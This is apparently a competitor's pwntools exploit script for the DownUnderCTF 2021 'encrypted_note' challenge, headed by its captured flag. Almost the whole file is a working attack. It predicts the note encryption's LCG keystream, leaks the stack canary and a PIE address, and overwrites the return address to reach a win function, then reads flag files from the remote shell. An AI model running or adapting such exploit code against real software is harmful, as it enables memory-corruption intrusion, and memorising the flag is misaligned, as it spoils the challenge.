#DUCTF{c4n_1_g3t_a_p1zza_th4t_1s_h4lf_p3pper0n1_4nd_h4lf_ch33s3_ple4se!}
from pwn import *

#elf = ELF("./encrypted_note")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.33.so")
#libc = elf.libc

def sa(s, d):
	target.sendafter(s, d)

def write_note(data):
	sa("> ", b"1")
	target.sendafter(": ", data)

def read_note():
	sa("> ", b"2")

def append(data):
	sa("> ", b"3")
	target.sendafter(": ", data)

def dump_data():
	write_note("\x41"*8 + "\x00")
	read_note()
	leak = target.recvline().strip()
	leak = b"".join(reversed([leak[i:i+2] for i in range(0, len(leak), 2)]))
	leak = int(leak, 0x10)
	#print(hex(leak ^ 0x4141414141414141))
	return (leak ^ 0x4141414141414141)


# Crypto functions written by @rey
from Crypto.Util.number import inverse, GCD
from functools import reduce

def get_inc(states, m, n):
    s1 = states[0]
    s2 = states[1]
    return ( s2 - m * s1) % n

def get_mult(states, n):
    s1 = states[0]
    s2 = states[1]
    s3 = states[2]
    m = ((s3 - s2) * inverse(s2-s1, n)) % n
    return m

def get_mod(states):
    diffs = [b - a for a, b in zip(states, states[1:])]
    z = [a*c - b**2 for a, b, c in zip(diffs, diffs[1:], diffs[2:])]
    n = reduce(GCD, z)
    return n

def predict_state(curr_state, n, m, c):
    p = (m * curr_state + c) % n
    return p

#context.log_level = "ERROR"
i = 0
while True:
#if True:
	i = i + 1
	print("Iter: " + str(i))
	target = remote("pwn-2021.duc.tf", 31908)
	#target = remote("localhost", 1337)
	#target = elf.process()
	#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
	#'''
	#read_note()
	#leak = target.recvline().strip()
	#leak = int(b"".join(reversed([leak[i:i+2] for i in range(0, len(leak), 2)])), 0x10)
	#log.info("_IO_file_jumps: " + hex(leak))
	#libc_base = leak - libc.sym['_IO_file_jumps']
	#libc_base = leak - 0x1ed4a0
	#log.info("LIBC Base: " + hex(libc_base))
	#pop_rdi = 0x0000000000026b72
	#'''


	states = [0x7d720cf248efceb5, 0x9d67b9dae8a12d7a, 0x2e189b780c6d0105, 0xe8818a7e03f802a, 0x5ad04da1a5317955, 0xb3e394ac93deecda]

	for i in range(6):
	    states[i] = dump_data()

	states = states[2:5]

	n = 2**64 #get_mod(states)
	#print("n:", n)

	m = get_mult(states, n)
	#print("m:", m)

	c = get_inc(states, m, n)
	#print("c:", c)

	pred = predict_state(states[-1], n, m, c)
	#print("predicted:", hex(pred))

	#------------------------------------------------------------------------------------------------------------------------------------
	payload = b""
	for i in range(10):
		pred = predict_state(pred, n, m, c)
		payload += p64(0x4141414141414141 ^ pred)
	pred = predict_state(pred, n, m, c)
	payload += p64(0x41 ^ pred)
	write_note(payload)

	pred = predict_state(pred, n, m, c)
	append(p64(0x41ff414141414141 ^ pred))
		
	for i in range(0):
		pred = predict_state(pred, n, m, c)
		append(p64(0x41ff414141414141 ^ pred))
		#print(".", end='')

	read_note()
	#'''
	target.recvuntil(b"41"*0x50)
	target.recv(16)
	leak_can = target.recv(16)
	leak_can = b"".join(reversed([leak_can[i:i+2] for i in range(0, len(leak_can), 2)]))
	canary = int(leak_can, 0x10)
	canary = canary & 0xffffffffffffff00
	log.info("Canary: " + hex(canary))
	#'''
	print("Checkpoint 1 cleared")
	#-----------------------------------------------------------------------------------------------------------------------------------

	payload = b""
	for i in range(10):
		pred = predict_state(pred, n, m, c)
		payload += p64(0x4141414141414141 ^ pred)
	pred = predict_state(pred, n, m, c)
	payload += p64(0x41414141 ^ pred)
	write_note(payload)

	#'''
	pred = predict_state(pred, n, m, c)
	append(p64(0x41004141ff414141 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0x4100414141414141 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0x4242424242424242 ^ pred))
	#'''
	#gdb.attach(target, 'b read_note\nc\nfinish\nx/20gx $rsp')

	read_note()
	#'''
	target.recvuntil(b"42"*7)
	target.recv(2)
	pie_leak = target.recv(12)
	pie_leak = b"".join(reversed([pie_leak[i:i+2] for i in range(0, len(pie_leak), 2)]))
	pie_leak = int(pie_leak, 0x10)
	win = pie_leak - 0x69f + 0x5d7 + 1
	log.info("win: " + hex(win))
	#'''
	print("Checkpoint 2 cleared")
	#----------------------------------------------------------------------------------------------------------------------------------

	#'''
	payload = b""
	for i in range(10):
		pred = predict_state(pred, n, m, c)
		payload += p64(0x4141414141414141 ^ pred)
	pred = predict_state(pred, n, m, c)
	payload += p64(0x414141414141 ^ pred)
	write_note(payload)

	pred = predict_state(pred, n, m, c)
	append(p64(0x410041414141ff41 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0x4100414141414141 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0x4300434343434343 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(win ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0 ^ pred))
	#gdb.attach(target, 'b read_note\nc\nfinish\nx/20gx $rsp')

	#read_note()
	#'''
	print("Checkpoint 3 cleared")
	#----------------------------------------------------------------------------------------------------------------------------------

	#'''
	payload = b""
	for i in range(10):
		pred = predict_state(pred, n, m, c)
		payload += p64(0x4141414141414141 ^ pred)
	pred = predict_state(pred, n, m, c)
	payload += p64(0x4141 ^ pred)
	write_note(payload)

	pred = predict_state(pred, n, m, c)
	append(p64(0x4100ff4141414141 ^ pred))
	pred = predict_state(pred, n, m, c)
	while pred >> 56 != canary >> 56:
		append(p64(0x6161616161616100 ^ pred))
		pred = predict_state(pred, n, m, c)
		print(".", end="")
	append(p64(canary ^ pred))
	'''
	pred = predict_state(pred, n, m, c)
	append(p64(0x4300434343434343 ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(win ^ pred))
	pred = predict_state(pred, n, m, c)
	append(p64(0 ^ pred))
	#'''
	#gdb.attach(target, 'b read_note\nc\nfinish\nx/20gx $rsp')

	#read_note()
	target.sendline("0")
	print("Checkpoint 4 cleared")
	#----------------------------------------------------------------------------------------------------------------------------------
	try:

		target.sendline(b"echo whoamiT")
		target.sendline(b"cat fl*")
		target.sendline(b"cat fl*")
		target.sendline(b"cat fl*")
		target.sendline(b"cat fl*")
		target.sendline(b"cat fl*")

		target,recvuntil("whoamiT")
		target.interactive()
	except:
		target.interactive()
		continue

